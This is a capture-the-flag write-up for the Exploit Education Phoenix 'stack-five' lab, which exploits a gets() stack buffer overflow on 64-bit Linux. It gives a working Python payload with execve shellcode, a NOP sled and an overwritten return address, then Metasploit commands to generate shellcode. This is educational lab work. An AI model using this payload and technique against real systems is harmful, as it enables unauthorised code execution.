# Stack 5

Write-up for: [Stack Five](https://exploit.education/phoenix/stack-five/)

<!--more-->

We will use this example as an intro to 64-bit exploitation (mostly because I failed the 32-bit version :P)

1. Identify the vulnerability

The call to `gets` in `start_level` is not bounds-checked. Thus, we can overflow the `buffer` variable by providing input longer than 128 bytes. The goal is to overwrite the stored return address and jump to our own shellcode.

2. Plan of action

Since there is no ASLR and the stack is executable, our payload should look something like this on the stack:

```
[NOP sled]
[execve("/bin/dash") shellcode]
[NOP padding]
[Address of buffer to return to NOP sled]
```

3. Exploit development

In order to exploit this bug, we must first find the address of the buffer and, more importantly, the offset of the return address. We'll use gdb:

```
(gdb) disas main
Dump of assembler code for function main:
0x00000000004005a4 <+0>:     push   %rbp
0x00000000004005a5 <+1>:     mov    %rsp,%rbp
0x00000000004005a8 <+4>:     sub    $0x10,%rsp
0x00000000004005ac <+8>:     mov    %edi,-0x4(%rbp)
0x00000000004005af <+11>:    mov    %rsi,-0x10(%rbp)
0x00000000004005b3 <+15>:    mov    $0x400620,%edi
0x00000000004005b8 <+20>:    callq  0x400400 <puts@plt>
0x00000000004005bd <+25>:    mov    $0x0,%eax
0x00000000004005c2 <+30>:    callq  0x40058d <start_level>
0x00000000004005c7 <+35>:    mov    $0x0,%eax
```

To find the stack address of the stored return address we can set a breakpoint
in `start_level` and inspect the stack. On the stack, we are looking for `4005c7`because this is where we will return to.
We can additionally provide some input to the program to find the address of the `buffer` variable.

```

```

First, we break on `start_level` to then disassemble the function to find the end of the function. Note that we could have directly disassembled the function saving us one breakpoint. We run the program with some valid input. Then we inspect the stack (note, it's `$rsp` instead of `$esp`. We're dealing with a 64-bit register now).

Inspecting the stack gives us the following data:

- buffer address: 0x7fffffffe490
- return address location: 0x7fffffffe518 
- offset: 136

Using this information we can craft a payload:

```python
buf = "\x90" * 20
buf += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
buf += "\x90"* (136 - len(buf)) + "\x7f\xff\xff\xff\xe4\xe0"[::-1]
print buf
```

The shellcode is from http://shell-storm.org/shellcode/files/shellcode-806.php

We start with a NOP sled to give us some flexibility with the exact location of the shellcode. Next, we place our shellcode in the buffer. This is what will be executed later. We fill the remaining space of the buffer with NOPs and overwrite the non-null part of the stored return address with what we believe is an address somewhere in our NOP sled. 

It's very important to note that the location of the stack might differ in gdb since it places additional environment variables before the stack.
To emulate a more realistic execution environment, you can unset these variables in gdb before executing the program:

```
unset env LINES
unset env COLUMNS
```

Even then, some experimentation with the return address and the length of the NOP slide might be required.

# Exploit

Now we are ready to run the exploit:

```
user@phoenix-amd64:/opt/phoenix/amd64$ python ~/stack-five.py > ~/stack-five
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-five < ~/stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
user@phoenix-amd64:/opt/phoenix/amd64$
```

Nothing happened? The reason is that using input redirection with `<` immediately terminates the program once the end of input is reached. Instead we need to pipe in the input with `cat ~/stack-five - | ./stack-five`. The `-` keeps stdin open. 

```
user@phoenix-amd64:/opt/phoenix/amd64$ whoami
user
user@phoenix-amd64:/opt/phoenix/amd64$ cat ~/stack-five - | ./stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
whoami
phoenix-amd64-stack-five
```

We popped a shell! Awesome :)

# Alternative, generate shellcode with metasploit 
```
  use payload/linux/x64/exec
  info
  set CMD /bin/sh
  info
  generate -b '\x00' -f python
```
